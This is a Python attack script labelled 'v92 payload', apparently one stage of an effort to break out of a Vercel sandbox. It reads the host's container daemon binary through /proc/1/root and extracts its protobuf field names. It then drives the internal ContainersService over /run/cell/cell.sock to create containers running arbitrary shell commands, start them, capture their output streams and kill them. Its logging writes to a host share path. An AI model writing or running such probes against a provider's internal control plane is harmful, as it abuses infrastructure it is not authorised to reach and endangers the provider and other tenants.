# -*- coding: utf-8 -*-
"""v92 payload: Create 带 command 主进程 → SO 保持连接 → Start → 验证主进程输出推流
v91 发现: (1) SO 未 attach/未 Start 时挂起 (2) 保持连接 + Start → Grpc-Status:0 正常结束但无数据
           (3) Exec 输出不推流 (4) Stdin 被 runc 禁用 ("stdin not supported by runc runtime")
v92 假设: StreamOutput 推送【容器主进程】(Create.command) 输出, Exec 输出不走此流
          v90 E 变体已确认 Create 接受 command/arguments 键(200+cid)
A: command=echo marker(双流 SO1+SO2) → Start → 6s 检查双流
B: attachStdin:true + command → SO1 → Start → 5s 检查
C: command 立即退出 → SO1 → Start → 5s 检查(流结束状态)
D: 无 command 对照 → SO1 → Start → 4s 检查
E: CreateRequest Command/Arguments 字段 tag(json 名)确认
"""
import socket, time, os, json, re, struct, threading

OUT = '/vercel/sandbox/v92c.out'


def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    for p in (OUT, '/mnt/h/volumes/run/vercel/share/v92c2.out'):
        try:
            open(p, 'a', encoding='utf-8', errors='replace').write(line + '\n')
        except Exception:
            pass
    try:
        print(line, flush=True)
    except Exception:
        pass


def pvarint(n):
    out = bytearray()
    while n > 127:
        out.append((n & 127) | 128)
        n >>= 7
    out.append(n)
    return bytes(out)


def pstr(field_no, s):
    b = s.encode() if isinstance(s, str) else s
    return pvarint((field_no << 3) | 2) + pvarint(len(b)) + b


def pvar(field_no, n):
    return pvarint((field_no << 3) | 0) + pvarint(n)


def rpc_raw(path, body=b'', ct='application/json', t=4):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect('/run/cell/cell.sock')
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n' % (path, ct, len(body)))
        s.sendall(req.encode() + body)
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', '', b''
        head, _, rest = data.partition(b'\r\n\r\n')
        lines = head.decode(errors='replace').split('\r\n')
        return lines[0], '\n'.join(lines[1:])[:100], rest
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, '', b''


def rpc(path, body='{}', t=3):
    st, hd, bd = rpc_raw(path, body.encode(), 'application/json', t)
    return st, bd[:600].decode(errors='replace')


def grpc_req(pl):
    return b'\x00' + struct.pack('>I', len(pl)) + pl


class Keep:
    """保持连接: 后台线程发请求并持续读, 1s 轮询 stop"""
    def __init__(self, path, body, t=20):
        self.path, self.body, self.t = path, body, t
        self.data = bytearray()
        self.done = threading.Event()
        self._stop = threading.Event()
        self._err = None
        self._t = threading.Thread(target=self._run)
        self._t.daemon = True

    def _run(self):
        try:
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            s.settimeout(1.0)
            s.connect('/run/cell/cell.sock')
            req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/grpc\r\n'
                   'Content-Length: %d\r\nConnection: keep-alive\r\n\r\n' % (self.path, len(self.body)))
            s.sendall(req.encode() + self.body)
            deadline = time.time() + self.t
            while not self._stop.is_set() and time.time() < deadline:
                try:
                    chunk = s.recv(8192)
                except socket.timeout:
                    continue
                except OSError:
                    break
                if not chunk:
                    break
                self.data += chunk
            try:
                s.close()
            except Exception:
                pass
        except Exception as e:
            self._err = e
        self.done.set()

    def start(self):
        self._t.start()
        return self

    def stop(self):
        self._stop.set()

    def status(self):
        return 'done=%s err=%s data=%d' % (self.done.is_set(), self._err, len(self.data))


def main():
    log('V92 payload start pid=%d' % os.getpid())
    R = '/proc/1/root'
    data = open(R + '/opt/vercel/celld', 'rb').read()

    # E. CreateRequest Command/Arguments json 名确认
    for m in re.finditer(rb'name=([a-z_]+),json=([a-zA-Z0-9_]+)', data):
        nm, js = m.group(1).decode(), m.group(2).decode()
        if nm in ('command', 'arguments', 'environment', 'mounts', 'image', 'drive_id', 'readonly_rootfs', 'rlimits'):
            log('E TAG %s json=%s' % (nm, js))

    CTR = '/vercel.hive.cell.api.containers.v1.ContainersService'

    def create(body, tag):
        st, bd = rpc(CTR + '/Create', body, t=8)
        cid = bd.split('"containerId":"')[1].split('"')[0] if '"containerId"' in bd else None
        log('%s CREATE -> %s cid=%s' % (tag, st, cid or bd[:120]))
        return cid

    def so_hold(tag, cid, stream, t=15):
        pl = pstr(1, cid) + pvar(2, stream)
        k = Keep(CTR + '/StreamOutput', grpc_req(pl), t=t).start()
        time.sleep(1.0)
        log('%s SO%d-open: %s' % (tag, stream, k.status()))
        return k

    # A. 双流: command 主进程 echo out+err
    cid = create('{"drive_id":"sandbox","command":"/bin/sh","arguments":["-c",'
                 '"echo V92A_OUT_ABC123; echo V92A_ERR_XYZ789 >&2; sleep 25"]}', 'A')
    if cid:
        k1 = so_hold('A', cid, 1)
        k2 = so_hold('A', cid, 2)
        rpc(CTR + '/Start', '{"containerId":"%s"}' % cid, t=5)
        log('A started')
        time.sleep(5.5)
        d1, d2 = bytes(k1.data), bytes(k2.data)
        log('A SO1-after: %s hit=%s raw=%r' % (k1.status(), b'V92A_OUT' in d1, d1[-400:]))
        log('A SO2-after: %s hit=%s raw=%r' % (k2.status(), b'V92A_ERR' in d2, d2[-400:]))
        k1.stop(); k2.stop()
        rpc(CTR + '/Kill', '{"containerId":"%s"}' % cid)
        log('A killed')
        time.sleep(0.5)

    # B. attachStdin:true + command
    cid = create('{"drive_id":"sandbox","attachStdin":true,"command":"/bin/sh",'
                 '"arguments":["-c","echo V92B_OUT_DEF456; sleep 25"]}', 'B')
    if cid:
        k1 = so_hold('B', cid, 1)
        rpc(CTR + '/Start', '{"containerId":"%s"}' % cid, t=5)
        log('B started')
        time.sleep(4.5)
        d1 = bytes(k1.data)
        log('B SO1-after: %s hit=%s raw=%r' % (k1.status(), b'V92B_OUT' in d1, d1[-400:]))
        k1.stop()
        rpc(CTR + '/Kill', '{"containerId":"%s"}' % cid)
        log('B killed')
        time.sleep(0.5)

    # C. command 立即退出
    cid = create('{"drive_id":"sandbox","command":"/bin/echo","arguments":["V92C_ONCE_GHI012"]}', 'C')
    if cid:
        k1 = so_hold('C', cid, 1)
        rpc(CTR + '/Start', '{"containerId":"%s"}' % cid, t=5)
        log('C started')
        time.sleep(4.5)
        d1 = bytes(k1.data)
        log('C SO1-after: %s hit=%s raw=%r' % (k1.status(), b'V92C_ONCE' in d1, d1[-400:]))
        k1.stop()
        rpc(CTR + '/Kill', '{"containerId":"%s"}' % cid)
        log('C killed')
        time.sleep(0.5)

    # D. 无 command 对照
    cid = create('{"drive_id":"sandbox"}', 'D')
    if cid:
        k1 = so_hold('D', cid, 1)
        rpc(CTR + '/Start', '{"containerId":"%s"}' % cid, t=5)
        log('D started')
        time.sleep(4)
        d1 = bytes(k1.data)
        log('D SO1-after: %s raw=%r' % (k1.status(), d1[-300:]))
        k1.stop()
        rpc(CTR + '/Kill', '{"containerId":"%s"}' % cid)
        log('D killed')

    log('V92C_DONE')


main()
